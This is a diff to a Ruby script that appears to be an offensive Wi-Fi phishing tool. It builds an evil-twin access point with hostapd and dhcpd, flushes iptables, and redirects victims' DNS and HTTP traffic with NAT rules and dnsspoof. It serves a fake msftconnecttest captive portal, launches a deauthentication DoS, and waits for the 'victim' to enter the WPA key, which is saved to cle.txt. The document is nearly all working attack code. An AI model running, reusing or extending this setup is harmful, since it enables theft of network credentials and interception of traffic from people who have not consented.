@@ -46,11 +46,60 @@ puts"#{$canal}"
 puts"#{$ssid}"
 puts"#{$page}"
 
-puts "Iniciando berate_ap..."
-system "berate_ap --mana-loud -n --redirect-to-localhost --ieee80211n -g 175.0.0.1 #{$carte} -c 3 #{"#$ssid ".shellescape} &> /dev/null &"
+
+puts "Preparando los ficheros de configuracion..."
+`touch /tmp/hostbase-1.6ES/dhcpd.conf`
+`touch /tmp/hostapd.conf`
+sleep 1 # country_code a voir
+`cat <<-EOF > /tmp/hostapd.conf
+interface=#{$carte}
+driver=nl80211
+ssid=#{$ssid} 
+hw_mode=g
+ieee80211n=1
+channel=3
+EOF`
+sleep 2
+`cat <<-EOF > /tmp/hostbase-1.6ES/dhcpd.conf
+option T150 code 150 = string;
+deny client-updates;
+one-lease-per-client false;
+allow bootp;
+ddns-updates off;
+ddns-update-style interim;
+authoritative;
+subnet 178.0.0.0 netmask 255.255.255.0 {
+interface #{$carte};
+range 178.0.0.2 178.0.0.10;
+option routers 178.0.0.1;
+option subnet-mask 255.255.255.0;
+option domain-name-servers 178.0.0.1;
+allow unknown-clients;
+}
+EOF`
+puts "Iniciando hostapd..."
+system "hostapd /tmp/hostapd.conf >> /tmp/hostbase-1.6ES/hostapd.txt &> /dev/null &"
 sleep 8
-piddnsspoofbis = spawn('dnsspoof -i ap0 &')
-sleep 5
+puts "\e[1;94m[*] Configuracion de iptables...\e[0m"
+`ifconfig #{$carte} up`
+`sysctl net.ipv4.ip_forward=1`
+`ifconfig #{$carte} 178.0.0.1 netmask 255.255.255.0`
+`ifconfig #{$carte} mtu 1400`
+`iptables --flush`
+`iptables --table nat --flush`
+`iptables --delete-chain`
+`iptables --table nat --delete-chain`
+sleep 2;
+`route add -net 178.0.0.0 netmask 255.255.255.0 gw 175.0.0.1 &> /dev/null`
+`iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 178.0.0.1`
+`iptables -P FORWARD ACCEPT`
+`iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to 178.0.0.1:80`
+sleep 1
+`echo > '/tmp/hostbase-1.6ES/dhcpd.leases'`
+piddhcp = spawn('dhcpd -d -f -lf /tmp/hostbase-1.6ES/dhcpd.leases -cf /tmp/hostbase-1.6ES/dhcpd.conf')
+sleep 2
+system "dnsspoof -i #{$carte} &"
+sleep 2
 puts "\e[1;94m[*] Configuracion del sistema de hotspot...\e[0m"
 Dir.chdir '/var/www'
 sleep 1
@@ -103,11 +152,11 @@ sleep 1
 `cp -R /etc/#{$page}/* /var/www/`
 sleep 3
 `mv #{$page}.php index.php`
-`chown -R root:www-data /var/www/*`
+`chown -R root:apache /var/www/*`
 sleep 1
 Dir.chdir '/var/www/shout'
 sleep 1
-`chown -R root:www-data /var/www/shout/chat.txt`
+`chown -R root:apache /var/www/shout/chat.txt`
 `chmod 764 /var/www/shout/chat.txt`
 `chmod  777 *`
 Dir.chdir '/var/www/msftconnecttest'
@@ -117,11 +166,11 @@ sleep 3
 Dir.chdir '/var/www/msftconnecttest'
 sleep 1
 `mv #{$page}.php index.php`
-`chown -R root:www-data /var/www/*`
+`chown -R root:apache /var/www/*`
 sleep 1
 Dir.chdir '/var/www/msftconnecttest/shout'
 sleep 1
-`chown -R root:www-data /var/www/msftconnecttest/shout/chat.txt`
+`chown -R root:apache /var/www/msftconnecttest/shout/chat.txt`
 `chmod 764 /var/www/msftconnecttest/shout/chat.txt`
 `chmod  777 *`
 Dir.chdir '/var/www/msftconnecttest'
@@ -129,16 +178,16 @@ sleep 1
 cle = "cle.txt"
 if File.exist?("cle.txt")
 `chmod 777 *`
-`chown -R root:www-data /var/www/msftconnecttest/cle.txt`
+`chown -R root:apache /var/www/msftconnecttest/cle.txt`
 `chmod 764 /var/www/msftconnecttest/cle.txt`
-`service apache2 restart`
+`service start httpd`
 sleep 4
 Dir.chdir '/var/www'
 sleep 1
 `chmod 777 *`
-`chown -R root:www-data /var/www/cle.txt`
+`chown -R root:apache /var/www/cle.txt`
 `chmod 764 /var/www/cle.txt`
-`service apache2 restart`
+`service start httpd`
 sleep 4
 puts "\e[1;32m[*] Fake AP creado... préparacion de la DoS...\e[0m"
 Dir.chdir '/tmp/hostbase-1.6ES'
@@ -146,7 +195,7 @@ sleep 1
 Cle.cleWpa # Lancement de la DoS ici et du code qui attend la victime
 else
 `chmod 777 *`
-`service apache2 restart`
+`service start httpd`
 sleep 4
 puts "\e[1;32m[*] Fake AP creado... préparacion de la DoS...\e[0m"
 Dir.chdir '/tmp/hostbase-1.6ES'
@@ -240,14 +289,13 @@ end
 
 class Attente
   def self.cleWifi
-load 'metcatcheck.rb'
     puts "Esperamos la victima... apoya ctrl+c para salir..."
 loop do
 sleep 1
 if File.zero?("/var/www/msftconnecttest/cle.txt")
 else
 puts "\e[1;32m[*] La clé wifi WPA ha sido registrado en /var/www/msftconnecttest/cle.txt y /var/www/cle.txt \e[0m"
-puts "\e[1;32m[*] Comando para recoger la clave wifi: cat /var/www/msftconnecttest/cle.txt\e[0m"
+puts "\e[1;32m[*] Comando para recoger la clave wifi: cat /var/www/msftconnecttest/cle.txt y cat /var/www/cle.txt\e[0m"
 puts "\e[1;32m[*] Clave wifi WPA-PSK:\e[0m"
 Dir.chdir '/var/www/msftconnecttest'
 sleep 2
@@ -261,7 +309,7 @@ sleep 600
 Dir.chdir '/tmp/hostbase-1.6ES'
   sleep 2
 puts "\e[1;94m[*] Exit de hostbase... limpieza de ficheros... mira en /var/www/msftconnecttest/cle.txt o /var/www/cle.txt para recoger la clave wifi... \e[0m"
-system("ruby wpsexit.rb")
+system("ruby exit.rb")
 end
 end
 
@@ -272,7 +320,6 @@ end
   sleep 3
   Dir.chdir '/tmp/hostbase-1.6ES'
   sleep 2
- load 'metcatcheck.rb'
   puts "Esperamos la victima... ctrl+c para salir..."
   until File.read('wash.txt').include?('wps_selected_registrar')
   sleep 1
